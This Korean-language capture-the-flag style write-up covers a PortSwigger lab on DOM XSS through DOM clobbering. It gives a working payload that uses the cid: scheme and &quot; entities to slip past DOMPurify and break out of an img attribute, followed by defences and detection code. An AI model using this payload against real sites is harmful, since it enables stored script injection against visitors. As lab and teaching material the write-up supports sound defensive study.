# Lab: DOM XSS exploiting DOM clobbering

## 개요

- **난이도**: Expert
- **주제**: DOM Clobbering — 전역 변수 덮어쓰기 / DOMPurify 우회 / `cid:` 스킴 / HTML 엔티티 인코딩
- **링크**: https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering

## 목표

댓글 기능이 DOMPurify 로 HTML 을 sanitize 하지만, DOM Clobbering 으로 페이지의 전역 변수를 덮어써서 XSS 를 실행한다. `cid:` 스킴이 DOMPurify 를 통과하고, `&quot;` HTML 엔티티로 속성 탈출을 유발하는 것이 핵심이다.

## DOM Clobbering 이란

```
HTML 요소에 id 또는 name 속성을 부여하면
해당 값이 window 전역 객체의 프로퍼티로 노출됨

예시:
  <a id="foo">
  → window.foo === document.getElementById('foo')
  → window.foo 가 기존 JS 변수를 덮어씀 (Clobber)

두 요소로 객체 프로퍼티 흉내:
  <a id="obj"><a id="obj" name="prop" href="VALUE">
  → window.obj           → HTMLCollection (두 요소의 집합)
  → window.obj.prop      → 두 번째 <a> 요소 (name="prop" 로 접근)
  → window.obj.prop.href → "VALUE"
```

## DOMPurify 란

```
[역할]
  사용자 입력 HTML 을 sanitize (정제) 하는 라이브러리
  XSS 를 유발하는 태그/속성/URL 스킴 등을 제거

[동작 예시]
  DOMPurify.sanitize('<script>alert(1)</script>')
  → ''  (script 태그 제거)

  DOMPurify.sanitize('<img src=x onerror=alert(1)>')
  → '<img src="x">'  (onerror 속성 제거)

  DOMPurify.sanitize('<a href="javascript:alert(1)">link</a>')
  → '<a>link</a>'  (javascript: 스킴 제거)

[이번 랩에서의 한계]
  DOMPurify 가 허용하는 것들을 조합해 우회
  → <a> 태그: 허용
  → id, name, href 속성: 허용
  → cid: 스킴: 허용 (이메일 인라인 콘텐츠용 스킴)
  → &quot; HTML 엔티티: 허용 (문자 참조)
```

## 취약한 페이지 코드 구조

```javascript
// 페이지가 댓글 로드 후 아바타 이미지를 동적으로 구성
var defaultAvatar = window.defaultAvatar ||
    {avatar: '/resources/images/avatarDefault.svg'};

// 아바타 URL 을 HTML 문자열에 삽입 (취약한 방식)
document.getElementById('avatarDisplay').innerHTML =
    '<img src="' + defaultAvatar.avatar + '">';
```

```
정상 동작:
  window.defaultAvatar 미정의 → 기본값 사용
  → '<img src="/resources/images/avatarDefault.svg">'

DOM Clobbering 후:
  window.defaultAvatar → 공격자가 심은 <a> 요소
  window.defaultAvatar.avatar → href = 'cid:"onerror=alert(1)//'
  → '<img src="cid:"onerror=alert(1)//">'
  → 속성 파싱: src="cid:" / onerror=alert(1) / //
  → img 로드 실패 → onerror 발화 → XSS!
```

## 공격 페이로드 분석

### 댓글에 삽입하는 페이로드

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

### 각 요소별 역할

```
<a id=defaultAvatar>
  → window.defaultAvatar 를 HTMLCollection 으로 정의 (Clobbering 시작)

<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
  → 같은 id 두 번째 요소 → HTMLCollection 에 추가
  → name=avatar → window.defaultAvatar.avatar 로 접근 가능
  → href="cid:&quot;onerror=alert(1)//"
```

### `cid:` 스킴의 역할

```
cid: (Content-ID) 스킴:
  이메일의 인라인 첨부파일 참조용 URI 스킴
  예: <img src="cid:image001@example.com">

DOMPurify 입장:
  javascript: 스킴 → 차단
  cid: 스킴 → 허용 (이메일 클라이언트 호환성)
  → cid: 로 시작하는 href 는 DOMPurify 통과!

공격 활용:
  href="cid:..." → DOMPurify 통과
  → 하지만 이후 HTML 에 삽입될 때 속성 탈출 유발 가능
```

### `&quot;` HTML 엔티티의 역할

```
HTML 파싱 과정:

1. DOMPurify 입력:
   href="cid:&quot;onerror=alert(1)//"

2. DOMPurify 처리 후 DOM 에 저장:
   <a href="cid:&quot;onerror=alert(1)//">
   브라우저 DOM 에서 href 속성값:
   cid:"onerror=alert(1)//    ← &quot; → " 로 디코딩됨

3. 페이지 JS 가 href 를 읽어 HTML 문자열에 삽입:
   '<img src="' + element.href + '">'
   = '<img src="cid:"onerror=alert(1)//">'

4. 브라우저 HTML 파싱:
   <img src="cid:" onerror=alert(1)//">
   ↑ " 로 인해 src 속성이 닫히고 onerror 속성 시작!

5. img 로드 실패 → onerror=alert(1) 실행 → XSS!
```

```
&quot; 를 사용하는 이유:
  DOMPurify 에 " 를 직접 넣으면 속성 탈출로 감지/제거될 수 있음
  &quot; 는 합법적인 HTML 엔티티 → DOMPurify 통과
  DOM 에 저장될 때 " 로 디코딩 → 이후 HTML 삽입 시 속성 탈출
```

## 전체 공격 흐름

```
1. 공격자: 댓글에 DOM Clobbering 페이로드 삽입
   <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
   → DOMPurify 통과 (허용된 태그/속성/스킴)

2. 피해자: 해당 페이지 방문
   댓글 HTML 이 DOM 에 삽입됨
   → window.defaultAvatar → <a> 요소 (Clobbered!)
   → window.defaultAvatar.avatar → 두 번째 <a>

3. 페이지 JS 실행:
   var defaultAvatar = window.defaultAvatar || {...}
   → window.defaultAvatar 가 존재 (Clobbered) → || 단락 평가 건너뜀
   defaultAvatar.avatar.href → 'cid:"onerror=alert(1)//'

4. HTML 문자열 조립:
   '<img src="cid:"onerror=alert(1)//">'

5. innerHTML 에 삽입 → XSS 실행
```

## DOMPurify 우회 요소 종합

```
이 공격에서 DOMPurify 를 통과한 요소들:

✓ <a> 태그: 허용된 태그
✓ id 속성: 허용된 속성
✓ name 속성: 허용된 속성
✓ href 속성: 허용된 속성
✓ cid: 스킴: DOMPurify 가 허용하는 URI 스킴
✓ &quot; 엔티티: 합법적인 HTML 문자 참조

→ 개별 요소는 모두 허용되지만
  조합하면 DOM Clobbering + 속성 탈출 + XSS 성립
```

## 핵심 정리

- **DOM Clobbering**: `id`/`name` 속성으로 HTML 요소를 전역 JS 변수로 노출시켜 기존 변수를 덮어쓸 수 있다.
- **DOMPurify 의 한계**: 허용된 요소/속성/스킴의 조합으로 우회 가능한 경우가 존재한다.
- **`cid:` 스킴**: DOMPurify 가 허용하지만, 이후 HTML 조립 과정에서 속성 탈출에 활용된다.
- **`&quot;` 엔티티**: DOMPurify 를 통과하고 DOM 에서 `"` 로 디코딩되어 속성 경계를 파괴한다.
- **방어**:
  - `window.someVar` 참조 전 타입 검사: `typeof defaultAvatar === 'object' && !('nodeName' in defaultAvatar)`
  - HTML 동적 조립 시 `innerHTML` 대신 DOM API 사용 (`createElement`, `setAttribute`)
  - DOMPurify 최신 버전 유지 (이 우회 기법이 패치될 수 있음)
  - CSP 로 인라인 스크립트 차단

## 배운 점 및 추가 학습

### 1. DOM Clobbering 기본 패턴

```html
<!-- 단일 변수 Clobbering -->
<input id="config">
→ window.config === <input> 요소

<!-- 객체.프로퍼티 Clobbering (같은 id 두 개) -->
<a id="config"><a id="config" name="url" href="https://evil.com">
→ window.config.url.href === "https://evil.com"

<!-- form + input 으로도 가능 -->
<form id="config"><input name="url" value="evil">
→ window.config.url.value === "evil"

<!-- 중첩 접근 (id + name) -->
<a id="x"><a id="x" name="y" href="VALUE">
→ window.x.y.href === "VALUE"
```

### 2. DOM Clobbering 탐지 방법

```javascript
// 전역 변수가 HTML 요소인지 확인
if (window.config instanceof HTMLElement) {
    // Clobbering 감지!
}

// nodeName 프로퍼티 확인 (DOM 요소에만 존재)
if (typeof window.config === 'object' && window.config.nodeName) {
    // Clobbering 감지!
}

// 안전한 대안: 전역 변수 대신 모듈 스코프 사용
(function() {
    var config = {url: '/default'};  // 전역 노출 안 됨
})();
```

### 3. DOMPurify 설정으로 cid: 차단

```javascript
// cid: 스킴 차단 설정
DOMPurify.sanitize(input, {
    ALLOWED_URI_REGEXP: /^(?:(?:https?|ftp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
    // cid: 스킴이 패턴에 포함되지 않으면 차단됨
});

// 또는 FORBID_ATTR 로 id, name 속성 제거
DOMPurify.sanitize(input, {
    FORBID_ATTR: ['id', 'name']
    // DOM Clobbering 자체를 방지
});
```

### 4. innerHTML 대신 DOM API 사용

```javascript
// 취약한 방법:
element.innerHTML = '<img src="' + url + '">';

// 안전한 방법 (DOM API):
const img = document.createElement('img');
img.src = url;  // 브라우저가 URL 을 안전하게 처리
element.appendChild(img);
// → src 에 javascript: 가 들어가도 실행 안 됨 (setAttribute 와 다름)
// → 속성 탈출 불가능
```
